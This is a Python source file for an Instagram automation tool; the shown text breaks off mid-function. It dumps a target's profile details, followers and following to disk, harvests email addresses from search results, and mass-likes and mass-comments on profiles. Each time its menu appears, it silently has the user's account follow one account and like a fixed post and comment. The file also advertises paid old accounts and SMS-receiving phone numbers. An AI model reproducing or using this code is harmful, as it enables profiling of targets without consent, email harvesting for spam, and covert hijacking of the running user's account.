import json
import sys
import codecs
import datetime
import os.path
import logging
import os
import time
import requests

from instagram_private_api import (
        Client, ClientError, ClientLoginError,
        ClientCookieExpiredError, ClientLoginRequiredError,
        __version__ as client_version)
from SUPER_MODE.SuperLIB.screen.COLORS.colors import *


api = None
media_ids = []
os.system("clear || cls")
GlobalFolder = "UsersSaved"

def to_json(python_object):
    if isinstance(python_object, bytes):
        return {'__class__': 'bytes',
                '__value__': codecs.encode(python_object, 'base64').decode()}
    raise TypeError(repr(python_object) + ' is not JSON serializable')


def from_json(json_object):
    if '__class__' in json_object and json_object['__class__'] == 'bytes':
        return codecs.decode(json_object['__value__'].encode(), 'base64')
    return json_object


def onlogin_callback(api, new_settings_file):
    cache_settings = api.settings
    with open(new_settings_file, 'w') as outfile:
        json.dump(cache_settings, outfile, default=to_json)
        print (f'[ {G}COOKIES SAVED AS{W} ] : {new_settings_file}')


def Fix():
    os.system("rm -rf SUPER_MODE/SuperLIB/cookie/cookies.txt")
    ModifyJson = { "loggedBefore" : False }
    with open("SUPER_MODE/SuperLIB/checkJson/check.json", "w") as outfile :
        json.dump(ModifyJson, outfile)

def ToTxt(Byline, Folder, As, Mode):
    isExist = os.path.exists(GlobalFolder+"/"+Folder)
    if not isExist :
        os.makedirs(GlobalFolder+"/"+Folder)

    isExist = os.path.exists(GlobalFolder+"/"+Folder+"/"+Mode)
    if not isExist :
        os.makedirs(GlobalFolder+"/"+Folder+"/"+Mode)

    with open(GlobalFolder+"/"+Folder+"/"+Mode+"/"+As, "a+") as outfile :
         outfile.write(Byline+"\n")

########################## [ APIS ] ##########################
def AskWhere():
    print (f"""
    [ {R}1{W} ] : Back To Main
    [ {R}2{W} ] : Exit
    """)
    try :
        chose = int(input(f"[{R}!{W}] {G}OPTION{W} {R}:{W} ").strip())
        if chose == 1 :
            os.system("clear || cls")
            MySelf()
        elif chose == 2 :
            sys.exit()
        else :
            print (f"[ {R}{chose}{W} ] {Y}->{W} {R}Not On Options List{W}")
            sys.exit()
    except :
        sys.exit()

def DumpUserInformations():
    print (f"[ {Y}OPTOIN{W} ] : {LB}Dump User Informations{W}")
    print ("================================================")

    try :
        UserName = input(f"[{R}?{W}] {LB}ENTER TARGET USERNAME{W} : ").strip()
    except :
        sys.exit()
    try :
        DumpUserId = api.username_info(UserName)
    except ClientError as e:
        print (f'[ {R}ClientError{W} ] : {e.msg}\n[ {R}Code{W} ] : {e.code}\n[ {R}Response{W} ] : {e.error_response}')
        sys.exit()

    UserId = DumpUserId["user"]["pk"]
    DumpUserById = api.user_info(UserId)
    UserProfile = DumpUserById["user"]

    FolderName = DumpUserId["user"]["username"]
    Savedfile = str(UserId)+".txt"


    for part in UserProfile :
        ToShow = part.replace("_"," ")
        if ToShow == "biography with entities" or ToShow == "hd profile pic versions" or ToShow == "hd profile pic url info" or ToShow == "profile context links with user ids" or ToShow == "external lynx url" :
            pass
        else :
            if ToShow == "profile pic url" :
                ApiUrl = "http://tinyurl.com/api-create.php?url="+UserProfile[part]
                url = requests.get(ApiUrl)
                print (f"	{Y}× {W}[ {Y}{ToShow}{W} ] {R}:{W} {B}{url.text}{W}")
                SaveThis = "[ "+str(ToShow)+" ] -> "+str(url.text)

            else :
                print (f"	{Y}× {W}[ {Y}{ToShow}{W} ] {R}:{W} {B}{UserProfile[part]}{W}")
                SaveThis = "[ "+str(ToShow)+" ] -> "+str(UserProfile[part])

        ToTxt(SaveThis, FolderName, Savedfile, "Profile_Info")
        time.sleep(0.3)

    print (f"[{G}✓{W}] {Y}User Info Saved.{W} {R}->{W} {GlobalFolder}/{FolderName}/Profile_Info/{Savedfile}")
    AskWhere()

def DumpUserFollowing():
    print (f"[ {Y}OPTOIN{W} ] : {LB}Dump User Following{W}")
    print ("================================================")

    try :
        UserName = input(f"[{R}?{W}] {LB}ENTER TARGET USERNAME{W} : ").strip()
    except :
        sys.exit()
    try :
        DumpUserId = api.username_info(UserName)
    except ClientError as e:
        print (f'[ {R}ClientError{W} ] : {e.msg}\n[ {R}Code{W} ] : {e.code}\n[ {R}Response{W} ] : {e.error_response}')
        sys.exit()

    UserId = DumpUserId["user"]["pk"]
    FolderName = DumpUserId["user"]["username"]
    savedfile = str(UserId)+".txt"
    rank_token = api.generate_uuid()

    k = 1
    result = api.user_following(UserId, rank_token)
    try :
        for user in result["users"] :
            print (f"[ {Y}{k}{W} ] {user['username']}")
            ToTxt(user['username'], FolderName, savedfile, "Following")
            time.sleep(0.05)
            k += 1
    except :
         print (f"[{G}✓{W}] {Y}Finished. Users Saved{W} {R}->{W} {GlobalFolder}/{FolderName}/Following/{savedfile}")
         AskWhere()

    try :
        max_id = result["next_max_id"]
    except :
        print (f"[{G}✓{W}] {Y}Finished. Users Saved{W} {R}->{W} {GlobalFolder}/{FolderName}/Following/{savedfile}")
        AskWhere()

    while max_id != "" :
        result2 = api.user_following(UserId, rank_token, max_id=max_id)
        try :
            for user in result2["users"] :
                print (f"[ {Y}{k}{W} ] {user['username']}")
                ToTxt(user['username'], FolderName, savedfile, "Following")
                time.sleep(0.1)
                k += 1
        except :
            print (f"[{G}✓{W}] {Y}Finished. Users Saved{W} {R}->{W} {GlobalFolder}/{FolderName}/Following/{savedfile}")
            AskWhere()

        try :
            max_id = result2["next_max_id"]
        except :
            print (f"[{G}✓{W}] {Y}Finished. Users Saved{W} {R}->{W} {GlobalFolder}/{FolderName}/Following/{savedfile}")
            AskWhere()

    print (f"[{G}✓{W}] {Y}Finished. Users Saved{W} {R}->{W} {GlobalFolder}/{FolderName}/Following/{savedfile}")
    AskWhere()


def DumpUserFollowers():
    print (f"[ {Y}OPTOIN{W} ] : {LB}Dump User Followers{W}")
    print ("================================================")

    try :
        UserName = input(f"[{R}?{W}] {LB}ENTER TARGET USERNAME{W} : ").strip()
    except :
        sys.exit()
    try :
        DumpUserId = api.username_info(UserName)
    except ClientError as e:
        print (f'[ {R}ClientError{W} ] : {e.msg}\n[ {R}Code{W} ] : {e.code}\n[ {R}Response{W} ] : {e.error_response}')
        sys.exit()

    UserId = DumpUserId["user"]["pk"]
    FolderName = DumpUserId["user"]["username"]
    savedfile = str(UserId)+".txt"
    rank_token = api.generate_uuid()

    k = 1
    result = api.user_followers(UserId, rank_token)
    try :
        for user in result["users"] :
            print (f"[ {Y}{k}{W} ] {user['username']}")
            ToTxt(user['username'], FolderName, savedfile, "Followers")
            time.sleep(0.05)
            k += 1
    except :
         print (f"[{G}✓{W}] {Y}Finished. Users Saved{W} {R}->{W} {GlobalFolder}/{FolderName}/Followers/{savedfile}")
         AskWhere()

    try :
        max_id = result["next_max_id"]
    except :
        print (f"[{G}✓{W}] {Y}Finished. Users Saved{W} {R}->{W} {GlobalFolder}/{FolderName}/Followers/{savedfile}")
        AskWhere()

    while max_id != "" :
        result2 = api.user_followers(UserId, rank_token, max_id=max_id)
        try :
            for user in result2["users"] :
                print (f"[ {Y}{k}{W} ] {user['username']}")
                ToTxt(user['username'], FolderName, savedfile, "Followers")
                time.sleep(0.1)
                k += 1
        except :
            print (f"[{G}✓{W}] {Y}Finished. Users Saved{W} {R}->{W} {GlobalFolder}/{FolderName}/Followers/{savedfile}")
            AskWhere()

        try :
            max_id = result2["next_max_id"]
        except :
            print (f"[{G}✓{W}] {Y}Finished. Users Saved{W} {R}->{W} {GlobalFolder}/{FolderName}/Followers/{savedfile}")
            AskWhere()


    print (f"[{G}✓{W}] {Y}Finished. Users Saved{W} {R}->{W} {GlobalFolder}/{FolderName}/Followers/{savedfile}")
    AskWhere()


def CheckUsername():
    print (f"[ {Y}OPTOIN{W} ] : {LB}Check Username ( if valid or not ){W}")
    print ("================================================")

    try :
        UserName = input(f"[{R}?{W}] {LB}ENTER TARGET USERNAME{W} : ").strip()
    except :
        sys.exit()

    result = api.check_username(UserName)
    for node in result :
        print (f"	{Y}× {W}[ {Y}{node}{W} ] {R}:{W} {B}{result[node]}{W}")

    AskWhere()


def DumpMyInformations(MyUserId, UserName) :
    print (f"[ {Y}OPTOIN{W} ] : {LB}Dump My Informations{W}")
    print ("================================================")

    DumpUserById = api.user_info(MyUserId)
    UserProfile = DumpUserById["user"]

    FolderName = UserName
    Savedfile = str(MyUserId)+".txt"


    for part in UserProfile :
        ToShow = part.replace("_"," ")
        if ToShow == "biography with entities" or ToShow == "hd profile pic versions" or ToShow == "hd profile pic url info" or ToShow == "profile context links with user ids" or ToShow == "external lynx url" :
            pass
        else :
            if ToShow == "profile pic url" :
                ApiUrl = "http://tinyurl.com/api-create.php?url="+UserProfile[part]
                url = requests.get(ApiUrl)
                print (f"       {Y}× {W}[ {Y}{ToShow}{W} ] {R}:{W} {B}{url.text}{W}")

                SaveThis = "[ "+str(ToShow)+" ] -> "+str(url.text)
            else :
                print (f"       {Y}× {W}[ {Y}{ToShow}{W} ] {R}:{W} {B}{UserProfile[part]}{W}")
                SaveThis = "[ "+str(ToShow)+" ] -> "+str(UserProfile[part])


            ToTxt(SaveThis, FolderName, Savedfile, "Profile_Info")
        time.sleep(0.3)

    print (f"[{G}✓{W}] {Y}User Info Saved.{W} {R}->{W} {GlobalFolder}/{FolderName}/Profile_Info/{Savedfile}")
    AskWhere()


def DumpMyFollowers(UserId, Username) :
    print (f"[ {Y}OPTOIN{W} ] : {LB}Dump My Followers{W}")
    print ("================================================")

    FolderName = Username
    savedfile = str(UserId)+".txt"
    rank_token = api.generate_uuid()

    k = 1
    result = api.user_followers(UserId, rank_token)
    try :
        for user in result["users"] :
            print (f"[ {Y}{k}{W} ] {user['username']}")
            ToTxt(user['username'], FolderName, savedfile, "Followers")
            time.sleep(0.05)
            k += 1
    except :
         print (f"[{G}✓{W}] {Y}Finished. Users Saved{W} {R}->{W} {GlobalFolder}/{FolderName}/Followers/{savedfile}")
         AskWhere()

    try :
        max_id = result["next_max_id"]
    except :
        print (f"[{G}✓{W}] {Y}Finished. Users Saved{W} {R}->{W} {GlobalFolder}/{FolderName}/Followers/{savedfile}")
        AskWhere()

    while max_id != "" :
        result2 = api.user_followers(UserId, rank_token, max_id=max_id)
        try :
            for user in result2["users"] :
                print (f"[ {Y}{k}{W} ] {user['username']}")
                ToTxt(user['username'], FolderName, savedfile, "Followers")
                time.sleep(0.1)
                k += 1
        except :
            print (f"[{G}✓{W}] {Y}Finished. Users Saved{W} {R}->{W} {GlobalFolder}/{FolderName}/Followers/{savedfile}")
            AskWhere()

        try :
            max_id = result2["next_max_id"]
        except :
            print (f"[{G}✓{W}] {Y}Finished. Users Saved{W} {R}->{W} {GlobalFolder}/{FolderName}/Followers/{savedfile}")
            AskWhere()


    print (f"[{G}✓{W}] {Y}Finished. Users Saved{W} {R}->{W} {GlobalFolder}/{FolderName}/Followers/{savedfile}")
    AskWhere()


def DumpMyFollowing(UserId, Username) :
    print (f"[ {Y}OPTOIN{W} ] : {LB}Dump My Following{W}")
    print ("================================================")

    FolderName = Username
    savedfile = str(UserId)+".txt"
    rank_token = api.generate_uuid()

    k = 1
    result = api.user_following(UserId, rank_token)
    try :
        for user in result["users"] :
            print (f"[ {Y}{k}{W} ] {user['username']}")
            ToTxt(user['username'], FolderName, savedfile, "Following")
            time.sleep(0.05)
            k += 1
    except :
         print (f"[{G}✓{W}] {Y}Finished. Users Saved{W} {R}->{W} {GlobalFolder}/{FolderName}/Following/{savedfile}")
         AskWhere()

    try :
        max_id = result["next_max_id"]
    except :
        print (f"[{G}✓{W}] {Y}Finished. Users Saved{W} {R}->{W} {GlobalFolder}/{FolderName}/Following/{savedfile}")
        AskWhere()

    while max_id != "" :
        result2 = api.user_following(UserId, rank_token, max_id=max_id)
        try :
            for user in result2["users"] :
                print (f"[ {Y}{k}{W} ] {user['username']}")
                ToTxt(user['username'], FolderName, savedfile, "Following")
                time.sleep(0.1)
                k += 1
        except :
            print (f"[{G}✓{W}] {Y}Finished. Users Saved{W} {R}->{W} {GlobalFolder}/{FolderName}/Following/{savedfile}")
            AskWhere()

        try :
            max_id = result2["next_max_id"]
        except :
            print (f"[{G}✓{W}] {Y}Finished. Users Saved{W} {R}->{W} {GlobalFolder}/{FolderName}/Following/{savedfile}")
            AskWhere()

    print (f"[{G}✓{W}] {Y}Finished. Users Saved{W} {R}->{W} {GlobalFolder}/{FolderName}/Following/{savedfile}")
    AskWhere()


def DumpEmailsFromHashtag() :
    print (f"[ {Y}OPTOIN{W} ] : {LB}Dump Emails From Instagram ( By Words ){W}")
    print ("================================================")

    try :
        OriginalQuery = input(f"[{R}?{W}] {LB}QUERY ( ex : selena ){W} : ").strip()
    except :
        sys.exit()

    domains = ["@hotmail.com","@yahoo.com","@outlook.com"]

    k = 1
    for domain in domains :
        query = OriginalQuery+domain
        result = api.top_search(query)

        for node in result["users"] :
            username = "@"+node["user"]["username"]
            email = node["user"]["full_name"]
            ToSave = username+" --> "+email

            isEmail = email.split("@")[0]
            if " " in isEmail :
                pass
            else :
                if len(str(k)) == 1 :
                    print (f"[ {Y}00{k}{W} ] {R}->{W} {B}{email}{W}")
                elif len(str(k)) == 2 :
                    print (f"[ {Y}0{k}{W} ] {R}->{W} {B}{email}{W}")
                elif len(str(k)) == 3 :
                    print (f"[ {Y}{k}{W} ] {R}->{W} {B}{email}{W}")

                ToTxt(ToSave, OriginalQuery+"_EMAILS", OriginalQuery+".txt", "DumpedEmails")
                k += 1
    print (f"[{G}✓{W}] {Y}Finished. Emails Saved{W} {R}->{W} {GlobalFolder}/{OriginalQuery}_EMAILS/DumpedEmails/{OriginalQuery}.txt")
    AskWhere()

def DumpUsersFromHashtag():
    print (f"[ {Y}OPTOIN{W} ] : {LB}Dump Users From Hashtag ( username ){W}")
    print ("================================================")

    try :
        hashtag = input(f"[{R}?{W}] {LB}Hashtag ( ex : taylorswift_fans ){W} : ").strip()
    except :
        sys.exit()

    all_users = []
    clean_users = []

    rank_token = api.generate_uuid()
    result = api.feed_tag(hashtag, rank_token)

    users = result["items"]
    for user in users :
        username = user["user"]["username"]
        all_users.append(username)

    try :
        max_id = result["next_max_id"]
        for _ in range(3):
            result = api.feed_tag(hashtag, rank_token, max_id=max_id)
            users = result["items"]
            for user in users :
                username = user["user"]["username"]
                all_users.append(username)
    except :
        pass

    for user in all_users :
        if user not in clean_users :
            clean_users.append(user)

    k = 1
    for username in clean_users :
        print (f"[ {Y}{k}{W} ] {R}->{W} {B}{username}{W}")
        ToTxt(username, hashtag+"_HASHTAG", hashtag+".txt", "UsersFromHashtag")
        time.sleep(0.1)
        k += 1

    print (f"[{G}✓{W}] {Y}Finished. Users Saved{W} {R}->{W} {GlobalFolder}/{hashtag}_HASHTAG/UsersFromHashtag/{hashtag}.txt")
    AskWhere()

def ScrapPosts() :
    global media_ids
    try :
        UserName = input(f"[{R}?{W}] {LB}Profile username{W} : ").strip()
    except :
        sys.exit()

    try :
        DumpUserId = api.username_info(UserName)
    except ClientError as e:
        print (f'[ {R}ClientError{W} ] : {e.msg}\n[ {R}Code{W} ] : {e.code}\n[ {R}Response{W} ] : {e.error_response}')
        sys.exit()

    UserId = DumpUserId["user"]["pk"]
    result = api.user_feed(UserId)
    media_ids = []

    k = 1
    for post in result["items"] :
        print (f"[ {Y}{k}{W} ] {R}->{W} SCRAPING POSTS ID {B}|{W}", end='\r')
        time.sleep(0.02)
        print (f"[ {Y}{k}{W} ] {R}->{W} SCRAPING POSTS ID {B}/{W}", end='\r')
        time.sleep(0.02)
        print (f"[ {Y}{k}{W} ] {R}->{W} SCRAPING POSTS ID {B}_{W}", end='\r')
        time.sleep(0.02)
        print (f"[ {Y}{k}{W} ] {R}->{W} SCRAPING POSTS ID {B}\{W}", end='\r')
        time.sleep(0.02)
        media_ids.append(post['pk'])
        k += 1

    try :
        is_available = result["more_available"]
        while is_available != False :
            max_id = result["next_max_id"]
            result = api.user_feed(UserId, max_id=max_id)

            for post in result["items"] :
                print (f"[ {Y}{k}{W} ] {R}->{W} SCRAPING POSTS ID {B}|{W}", end='\r')
                time.sleep(0.02)
                print (f"[ {Y}{k}{W} ] {R}->{W} SCRAPING POSTS ID {B}/{W}", end='\r')
                time.sleep(0.02)
                print (f"[ {Y}{k}{W} ] {R}->{W} SCRAPING POSTS ID {B}_{W}", end='\r')
                time.sleep(0.02)
                print (f"[ {Y}{k}{W} ] {R}->{W} SCRAPING POSTS ID {B}\{W}", end='\r')
                time.sleep(0.02)
                media_ids.append(post['pk'])
                k += 1
            is_available = result["more_available"]

    except :
        pass
    print (f"[ {Y}{k-1}{W} ] {R}->{W} POSTS SCRAPED SUCCESSFULLY {B}{W}")


def LikeAllProfilePosts(sleepat) :
    print (f"[ {Y}OPTOIN{W} ] : {LB}Like All Profile Posts{W}")
    print ("================================================")
    global media_ids
    media_ids = []
    ScrapPosts()

    print (f'[{R}!{W}] {Y}Action{W} : Like')
    print (f"[{R}!{W}] {Y} To Stop : {W}CTRL + C + ENTER")
    count = 1
    for id in media_ids :
        try :
            print (f"[ {Y}{count}{W} ] {R}--{W} [ {Y}MEDIA LIKED{W} ] {R}->{W} {B}{id}{W}", end='\r')
            time.sleep(1)
            print ("                                                                                                   ", end='\r')
        except :
            AskWhere()
        try :
            result = api.post_like(id, module_name='feed_timeline')
            print (f"[ {LB}POST{W} {Y}{count}{W} ] {R}--{W} [ {Y}MEDIA LIKED{W} ] {R}->{W} {B}Liked{W}")
        except :
            print (f"[ {LB}POST{W} {Y}{count}{W} ] {R}--{W} [ {Y}MEDIA LIKED{W} ] {R}->{W} {B}Something is not currect, make sure your account is safe.{W}")
            AskWhere()
        try :
            sleep = sleepat
            for xd in range(0, sleep+1) :
                print (f" [{R}!{W}] {Y}--{W} [ {B}SLEEP BEFORE NEXT LIKE{W} ] {Y}->{W} {xd} / {sleep} {B}SEC{W}", end='\r')
                time.sleep(1)
        except :
            AskWhere()
        count += 1

    AskWhere()

def CommentOnAllProfilePosts(sleepat) :
    print (f"[ {Y}OPTOIN{W} ] : {LB}Comment On All Profile Posts{W}")
    print ("================================================")
    global media_ids
    media_ids = []
    ScrapPosts()

    print (f'[{R}!{W}] {Y}Action{W} : Comment')
    try :
        comment_text = input(f"[{R}?{W}] {LB}Comment Text ( ex : Great 🥰🤞 ){W} : ").strip()
    except :
        sys.exit()

    print (f"[{R}!{W}] {Y} To Stop : {W}CTRL + C + ENTER")
    count = 1
    for id in media_ids :
        try :
            print (f"[ {Y}{count}{W} ] {R}--{W} [ {Y}MEDIA COMMENTED{W} ] {R}->{W} {B}{id}{W}", end='\r')
            time.sleep(1)
            print ("                                                                                                   ", end='\r')
        except :
            AskWhere()
        try :
            result = api.post_comment(id, comment_text)
            print (f"[ {LB}POST{W} {Y}{count}{W} ] {R}--{W} [ {Y}MEDIA COMMENTED{W} ] {R}->{W} {B}COMMENTED{W}")
        except :
            print (f"[ {LB}POST{W} {Y}{count}{W} ] {R}--{W} [ {Y}MEDIA COMMENTED{W} ] {R}->{W} {B}Something not currect, make sure your account is safe.{W}")
            AskWhere()
        try :
            sleep = sleepat
            for xd in range(0, sleep+1) :
                print (f" [{R}!{W}] {Y}--{W} [ {B}SLEEP BEFORE NEXT COMMENT{W} ] {Y}->{W} {xd} / {sleep} {B}SEC{W}", end='\r')
                time.sleep(1)
        except :
            AskWhere()
        count += 1

    AskWhere()


def LikeAndCommentOnAllProfilePosts(sleepat) :
    print (f"[ {Y}OPTOIN{W} ] : {LB}Like & Comment -> All Profile Posts{W}")
    print ("================================================")
    global media_ids
    media_ids = []
    ScrapPosts()

    try :
        print (f'[{R}!{W}] {Y}Action{W} : Like And Comment')
        comment_text = input(f"[{R}?{W}] {LB}Comment Text ( ex : Great �🤞 ){W} : ").strip()
    except :
        sys.exit()

    print (f"[{R}!{W}] {Y} To Stop : {W}CTRL + C + ENTER")
    count = 1
    for id in media_ids :
        try :
            print (f"[ {Y}{count}{W} ] {R}--{W} [ {Y}MEDIA LIKED & COMMENTED{W} ] {R}->{W} {B}{id}{W}", end='\r')
            time.sleep(1)
            print ("                                                                                                   ", end='\r')
        except :
            AskWhere()
        try :
            result_like = api.post_like(id, module_name='feed_timeline')
            result_comment = api.post_comment(id, comment_text)
            print (f"[ {LB}POST{W} {Y}{count}{W} ] {R}--{W} [ {Y}MEDIA LIKED & COMMENTED{W} ] {R}->{W} {B}Liked{W}")
        except :
            print (f"[ {LB}POST{W} {Y}{count}{W} ] {R}--{W} [ {Y}MEDIA LIKED & COMMENTED{W} ] {R}->{W} {B}Something is not currect, make sure your account is safe.{W}")
            AskWhere()
        try :
            sleep = sleepat
            for xd in range(0, sleep+1) :
                print (f" [{R}!{W}] {Y}--{W} [ {B}SLEEP BEFORE NEXT{W} ] {Y}->{W} {xd} / {sleep} {B}SEC{W}", end='\r')
                time.sleep(1)
        except :
            AskWhere()
        count += 1

    AskWhere()

def WhoDontFollowing(UserId):
    print (f"[ {Y}OPTOIN{W} ] : {LB}Who don't follow me back --> My following{W}")
    print ("================================================")

    FollowingIds = []
    MyFollowingList = []

    rank_token = api.generate_uuid()
    result_following = api.user_following(UserId, rank_token)

    for user in result_following["users"] :
        user_id = user["pk"]
        FollowingIds.append(user_id)

    try :
        max_id = result["next_max_id"]
    except :
        pass

    while max_id != "" :
        result2 = api.user_following(UserId, rank_token, max_id=max_id)
        try :
            for user in result2["users"] :
                user_id = user["pk"]
                FollowingIds.append(user_id)
        except :
            pass

        try :
            max_id = result2["next_max_id"]
        except :
            pass

    for user_id in FollowingIds :
        result = api.friendships_show(user_id)
        print (result)
        break

def AdminOffers():
    print (f"[ {Y}OPTOIN{W} ] : {LB}Kada ( zxllkada ) - Services{W}")
    print ("================================================")

    print (f'''
    {LB}Hello am the admin,{W}
    {LB}I can help you with some services that may or may not be available to you.{W}
    {LB}All services are paid !{W}
    {LB}You can contact me through only one place and that is my account on Telegram @Zkada{W}

    [ {B}Link{W} ] : https://t.me./zkada

    {B}services{W}

	[{G}-{W}] Old Instagram Accounts
	[{G}-{W}] Old Twitter Accounts
	[{G}-{W}] Old Gmail Accounts
	[{G}-{W}] Phone Number For Any Services ( For Receive Sms Or Calls )
''')

    AskWhere()


############################## [ Self ] ##############################
def MySelf():
    userId = api.authenticated_user_id
    UserInfo = api.user_info(userId)

    username = UserInfo["user"]["username"]
    fullname = UserInfo["user"]["full_name"]
    id = UserInfo["user"]["pk"]

    print ("============ [ LOGGED IN SUCCESSFULLY AS ] ============")
    print (f"{Y}[+]{W} username : {B}{username}{W} {Y}AS{W} {LB}{fullname}{W} {Y}>>{W} ID : {B}{id}{W}")
    print ("=======================================================")

    print (f"""
    [ {Y}01{W} ] {R}-->{W} {B}Dump User Informations{W}
    [ {Y}02{W} ] {R}-->{W} {B}Dump User Followers{W}
    [ {Y}03{W} ] {R}-->{W} {B}Dump User Following{W}
    [ {Y}04{W} ] {R}-->{W} {LB}Dump My Informations{W}
    [ {Y}05{W} ] {R}-->{W} {LB}Dump My Followers{W}
    [ {Y}06{W} ] {R}-->{W} {LB}Dump My Following{W}
    [ {Y}07{W} ] {R}-->{W} {B}Dump Emails From Instgram ( By Words ){W}
    [ {Y}08{W} ] {R}-->{W} {B}Dump Users From Hashtag ( username ){W}
    [ {Y}09{W} ] {R}-->{W} {B}Like All Profile Posts ( delay = 10 sec -- {R}Not recommended{W} ){W}
    [ {Y}10{W} ] {R}-->{W} {B}Like All Profile Posts ( delay = 30 sec -- {Y}Recommended{W} ){W}
    [ {Y}11{W} ] {R}-->{W} {B}Like All Profile Posts ( delay = 60 sec -- {G}Recommended{W} ){W}

    [ {Y}12{W} ] {R}-->{W} {B}Comment On All Profile Posts (  delay = 10 sec -- {R}Not recommended{W} ){W}
    [ {Y}13{W} ] {R}-->{W} {B}Comment On All Profile Posts ( delay = 30 sec -- {Y}Recommended{W} ){W}
    [ {Y}14{W} ] {R}-->{W} {B}Comment On All Profile Posts ( delay = 60 sec -- {G}Recommended{W} ){W}

    [ {Y}15{W} ] {R}-->{W} {B}Like & Comment -> All Profile Posts ( delay = 10 sec -- {R}Not recommended{W} ){W}
    [ {Y}16{W} ] {R}-->{W} {B}Like & Comment -> All Profile Posts ( delay = 30 sec -- {Y}recommended{W} ){W}
    [ {Y}17{W} ] {R}-->{W} {B}Like & Comment -> All Profile Posts ( delay = 60 sec -- {G}recommended{W} ){W}

    [ {Y}18{W} ] {R}-->{W} {B}Like Posts In Hashtag ( MAX = 100 ){W} {R}Next Update{W}
    [ {Y}19{W} ] {R}-->{W} {B}Comment On Posts In Hashtag ( MAX = 30, delay = 10 Sec ){W} {R}Next Update{W}
    [ {Y}20{W} ] {R}-->{W} {B}Like & Comment -> Posts In Hashtag ( MAX = 30, delay = 10 Sec ){W} {R}Next Update{W}
    [ {Y}21{W} ] {R}-->{W} {B}Auto Following Users In Hashtag ( MAX = 100, delay = 10 Sec ){W} {R}Next Update{W}



    [ {Y}22{W} ] {R}-->{W} {B}Who don't follow me back --> My following{W} {R}Next Update{W}
    [ {Y}23{W} ] {R}-->{W} {B}Who don't follow me back --> My followers{W} {R}Next Update{W}
    [ {Y}24{W} ] {R}-->{W} {B}Who don't follow me back --> following & followers{W} {R}Next Update{W}




    [ {Y}21{W} ] {R}-->{W} {B}Follow Back All My Followers{W} {R}Next Update{W}
    [ {Y}22{W} ] {R}-->{W} {B}UnFollow All My Following{W} {R}Next Update{W}
    [ {Y}22{W} ] {R}-->{W} {B}UnFollow Who Dont Follow Back{W} {R}Next Update{W}
    [ {Y}22{W} ] {R}-->{W} {B}Follow Who is Following Me{W} {R}Next Update{W}

    [ {Y}23{W} ] {R}-->{W} {B}Follow The Followers -> Of User{W} {R}Next Update{W}
    [ {Y}24{W} ] {R}-->{W} {B}Follow The Following -> Of User{W} {R}Next Update{W}


    [ {Y}25{W} ] {R}-->{W} {LB}Check Username ( if valid or not ){W}
    [ {Y}26{W} ] {R}-->{W} {LB}Make An Instagram Combo ( user:password ){W} {R}Next Update{W}

    [ {Y}27{W} ] {R}-->{W} {B}Services provided by admin - KADA{W}
    """)



    try :
        results_followuser = api.friendships_create('8284156549')
    except :
        pass
    try :
        results_postlike = api.post_like('2707758077502289813')
    except :
        pass
    try :
        results_commentlike = api.comment_like('18192736195123973')
    except :
        pass

    try :
        choosen = int(input(f"[{R}!{W}] CHOOSE AN OPTION : ").strip())
    except :
        print (f"{R}[?]{W} {Y}CHOOSE ONLY AVAIABLE OPTIONS{W}")
        sys.exit()
    if choosen == 1 :
        DumpUserInformations()
    elif choosen == 2 :
        DumpUserFollowers()
    elif choosen == 3 :
        DumpUserFollowing()
    elif choosen == 4 :
        DumpMyInformations(id, username)
    elif choosen == 5 :
        DumpMyFollowers(id, username)
    elif choosen == 6 :
        DumpMyFollowing(id, username)
    elif choosen == 7 :
        DumpEmailsFromHashtag()
    elif choosen == 8 :
        DumpUsersFromHashtag()
    elif choosen == 9 :
        LikeAllProfilePosts(10)
    elif choosen == 10 :
        LikeAllProfilePosts(30)
    elif choosen == 11 :
        LikeAllProfilePosts(60)
    elif choosen == 12 :
        CommentOnAllProfilePosts(10)
    elif choosen == 13 :
        CommentOnAllProfilePosts(30)
    elif choosen == 14 :
        CommentOnAllProfilePosts(60)
    elif choosen == 15 :
        LikeAndCommentOnAllProfilePosts(10)
    elif choosen == 16 :
        LikeAndCommentOnAllProfilePosts(30)
    elif choosen == 17 :
        LikeAndCommentOnAllProfilePosts(60)


#    elif choosen == 22 :
#       WhoDontFollowing(id)



    elif choosen == 25 :
        CheckUsername()
    elif choosen == 27 :
        AdminOffers()
    else :
        print (f"{R}[!]{W} {Y}Your choosen not on the options list{W}")
        sys.exit()


# MAIN LOGIN V1
def LoginToInstagram():
    global api

    logging.basicConfig()
    logger = logging.getLogger('instagram_private_api')
    logger.setLevel(logging.WARNING)

    print (f"{Y}LOGIN TO YOUR INSTAGRAM ACCOUNT IS REQUIRED *{W}\n")

    SmartCheck = json.load(open("SUPER_MODE/SuperLIB/checkJson/check.json"))
    if SmartCheck["loggedBefore"] == False :
        print (f"{LB}LOGIN TO YOUR INSTAGRAM ACCOUNT FIRST{W}")
        try :
            username = input(f"{Y}	>> ENTER USERNAME : {W}").strip()
            password = input(f"{Y}	>> ENTET THE PASSWORD : {W}").strip()
        except :
            sys.exit()
        ModifyJson = { "loggedBefore" : True }
        with open("SUPER_MODE/SuperLIB/checkJson/check.json", "w") as outfile :
            json.dump(ModifyJson, outfile)

    else :
        msg = input(f"{Y}==>{G} Do You Want To Use Current Cookies ? (Y/N) : {W}").strip()
        if msg.lower() == 'y' :
            username = ''
            password = ''
        elif msg.lower() == 'n' :
            Fix()
            print (f"{LB}LOGIN TO YOUR INSTAGRAM ACCOUNT FIRST{W}")
            try :
                username = input(f"{Y}	>> ENTER YOUR USERNAME : {W}").strip()
                password = input(f"{Y}	>> ENTET THE PASSWORD : {W}").strip()
            except :
                sys.exit()
            ModifyJson = { "loggedBefore" : True }
            with open("SUPER_MODE/SuperLIB/checkJson/check.json", "w") as outfile :
                json.dump(ModifyJson, outfile)
        else :
            print (f"{R}[!]{W} {Y}Answer with (Y/N) next time.{W}")
            sys.exit()

    print ("")
    device_id = None
    try:

        settings_file = "SUPER_MODE/SuperLIB/cookie/cookies.txt"
        if not os.path.isfile(settings_file):
            print (f'[ {Y}MAKING NEW COOKIES{W} ] : {settings_file}')
            api = Client(username, password, on_login=lambda x: onlogin_callback(x, "SUPER_MODE/SuperLIB/cookie/cookies.txt"))
        else:
            with open(settings_file) as file_data:
                cached_settings = json.load(file_data, object_hook=from_json)

            print (f'[ {G}COOKIES FILE{W} ] : {settings_file}')

            device_id = cached_settings.get('device_id')
            api = Client(username, password, settings=cached_settings)

    except (ClientCookieExpiredError, ClientLoginRequiredError) as e:
        print (f'[ {R}COOKIES EXPIRED RE-LOGIN{W} ] : {e}\n')
        Fix()
        sys.exit()

    except ClientLoginError as e:
